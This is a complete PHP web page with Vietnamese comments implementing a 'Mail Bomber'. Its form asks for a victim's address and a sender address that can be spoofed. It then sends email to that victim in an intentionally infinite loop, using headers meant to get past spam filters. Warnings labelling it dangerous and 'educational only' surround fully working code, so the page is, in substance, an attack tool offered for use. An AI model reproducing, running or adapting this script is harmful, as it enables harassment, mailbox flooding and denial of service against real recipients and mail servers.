<?php
// error_reporting(E_ALL); // Bật hiển thị lỗi để debug (không nên dùng trên production)
// ini_set('display_errors', 1); // Bật hiển thị lỗi để debug

// Tăng thời gian thực thi và bộ nhớ (CẨN THẬN!) - Chỉ để minh họa vòng lặp dài
// set_time_limit(300); // Ví dụ: 5 phút, 0 là không giới hạn (RẤT NGUY HIỂM)
// ini_set('memory_limit', '256M'); // Ví dụ: Tăng giới hạn bộ nhớ

// WARNING: EXTREMELY DANGEROUS SCRIPT - MAIL BOMBER
// DO NOT RUN THIS CODE. IT CREATES AN INFINITE LOOP AND CAN HARM YOUR SERVER.
// PROVIDED FOR EDUCATIONAL ANALYSIS ONLY.
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Mail Bomber - !! DANGEROUS SCRIPT !!</title>
    <style>
        body { font-family: sans-serif; }
        label { display: inline-block; width: 90px; vertical-align: top; }
        input[type="text"], input[type="email"], textarea { margin-bottom: 10px; padding: 5px; border: 1px solid #ccc; }
        input[type="submit"] { padding: 10px 15px; background-color: #d9534f; color: white; border: none; cursor: pointer; }
        input[type="submit"]:hover { background-color: #c9302c; }
        .error { color: red; font-weight: bold; }
        .success { color: green; }
    </style>
</head>
<body>

<h1>Mail Bomber Tool (!! CẢNH BÁO NGUY HIỂM !!)</h1>
<p style="color:red; font-weight:bold;">CẢNH BÁO: Sử dụng công cụ này là bất hợp pháp và có thể gây hậu quả nghiêm trọng cho máy chủ và danh tiếng IP của bạn. KHÔNG SỬ DỤNG!</p>

<?php
// Kiểm tra xem form đã được gửi và các trường cần thiết có dữ liệu không
if (isset($_POST['submit'])) {
    // Lấy dữ liệu từ form - Cần thêm validation/sanitization thực tế
    $to = trim($_POST['nhan'] ?? ''); // Người nhận
    $from = trim($_POST['gui'] ?? ''); // Người gửi (có thể giả mạo)
    $sub = trim($_POST['tieude'] ?? ''); // Tiêu đề
    $noidung = trim($_POST['noidung'] ?? ''); // Nội dung

    // Kiểm tra cơ bản xem có thiếu thông tin không
    if (empty($to) || empty($from) || empty($sub) || empty($noidung)) {
        echo "<h3 class='error'>Lỗi: Vui lòng nhập đầy đủ tất cả thông tin!</h3>";
        // Hiển thị lại form nếu thiếu thông tin
        display_form($to, $from, $sub, $noidung);
    }
    // Kiểm tra định dạng email cơ bản (rất đơn giản)
    elseif (!filter_var($to, FILTER_VALIDATE_EMAIL) || !filter_var($from, FILTER_VALIDATE_EMAIL)) {
         echo "<h3 class='error'>Lỗi: Địa chỉ email Người nhận hoặc Người gửi không hợp lệ!</h3>";
         display_form($to, $from, $sub, $noidung);
    }
    else {
        // Chuẩn bị header email
        // Thêm các header chuẩn để tăng khả năng qua bộ lọc (nhưng vẫn là spam)
        $header = "MIME-Version: 1.0\r\n";
        $header .= "Content-type: text/plain; charset=UTF-8\r\n";
        $header .= "From: " . $from . "\r\n"; // From address do người dùng nhập
        $header .= "Reply-To: " . $from . "\r\n";
        // $header .= "Cc: " . $from . "\r\n"; // Giữ nguyên như code gốc nếu muốn CC cho chính người gửi
        $header .= "X-Mailer: PHP/" . phpversion(); // Thông tin trình gửi

        echo "<h2>Đang bắt đầu gửi mail tới: " . htmlspecialchars($to) . "</h2>";
        echo "<p>Từ: " . htmlspecialchars($from) . "</p>";
        echo "<p>Chủ đề gốc: " . htmlspecialchars($sub) . "</p>";
        echo "<p style='color:orange; font-weight:bold;'>Vòng lặp gửi mail sẽ chạy MÃI MÃI hoặc cho đến khi bị dừng bởi giới hạn máy chủ!</p><hr>";

        $i = 0;
        // VÒNG LẶP VÔ HẠN CỐ Ý - ĐÂY LÀ PHẦN NGUY HIỂM NHẤT
        do {
            $current_subject = $sub . " [" . $i . "]"; // Thêm số thứ tự vào chủ đề
            $current_message = $noidung . "\n\n---\nMessage ID: " . $i . "\nSent at: " . date('Y-m-d H:i:s'); // Thêm số thứ tự và thời gian vào nội dung

            // Cố gắng gửi mail, sử dụng @ để ẩn lỗi trực tiếp từ hàm mail()
            // Việc ẩn lỗi không được khuyến khích trong code thông thường
            if (@mail($to, $current_subject, $current_message, $header)) {
                echo "<span class='success'>+ Email #" . $i . " đã được yêu cầu gửi đi.</span><br/>";
            } else {
                // Ghi nhận lỗi nhưng vẫn tiếp tục (theo logic gốc)
                echo "<span class='error'>- Lỗi khi yêu cầu gửi email #" . $i . ". Có thể máy chủ mail đã từ chối hoặc có lỗi cấu hình.</span><br/>";
                // Trong thực tế, nên dừng lại ở đây nếu có lỗi nghiêm trọng
                // break;
            }

            $i++;

            // Ép buộc gửi output ra trình duyệt ngay lập tức (quan trọng cho vòng lặp dài)
            if (ob_get_level() > 0) {
                ob_flush();
            }
            flush();

            // Có thể thêm một khoảng dừng nhỏ để giảm tốc độ, tránh làm sập mail server quá nhanh
            // usleep(200000); // Dừng 0.2 giây

        } while (!isset($dung)); // Biến $dung không bao giờ được định nghĩa -> VÒNG LẶP VÔ HẠN

        // Dòng này sẽ không bao giờ đạt được trừ khi vòng lặp bị phá vỡ từ bên ngoài
        echo "<hr><h2>Vòng lặp kết thúc (Bất thường!).</h2>";
    }
} else {
    // Nếu form chưa được gửi, hiển thị form
    display_form();
}

// Hàm để hiển thị form HTML
function display_form($to = '', $from = '', $sub = '', $noidung = '') {
    ?>
    <h3>Nhập đầy đủ thông tin để "Bom Mail" (CỰC KỲ NGUY HIỂM)</h3>
    <form name="mailer" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
        <div>
            <p><label for="nhan">VicTim :</label><input type="email" id="nhan" name="nhan" size="40" value="<?php echo htmlspecialchars($to); ?>" required></p>
        </div>
        <div>
            <p><label for="gui">Người gửi :</label><input type="email" id="gui" name="gui" size="40" value="<?php echo htmlspecialchars($from); ?>" required></p>
        </div>
        <div>
            <p><label for="tieude">Tiêu đề:</label><input type="text" id="tieude" name="tieude" size="60" value="<?php echo htmlspecialchars($sub); ?>" required></p>
        </div>
        <div>
            <p><label for="noidung">Nội dung:</label></p>
            <textarea id="noidung" name="noidung" cols="80" rows="15" required><?php echo htmlspecialchars($noidung); ?></textarea>
        </div>
        <p><input type="submit" value="!!! Bom Mail !!! (CẢNH BÁO)" name="submit"></p>
    </form>
    <?php
} // Kết thúc hàm display_form

// Cố gắng include file footer, ẩn lỗi nếu file không tồn tại
// Việc dùng @ không được khuyến khích, nên kiểm tra file tồn tại trước khi include
@include('footer.inc');
?>

</body>
</html>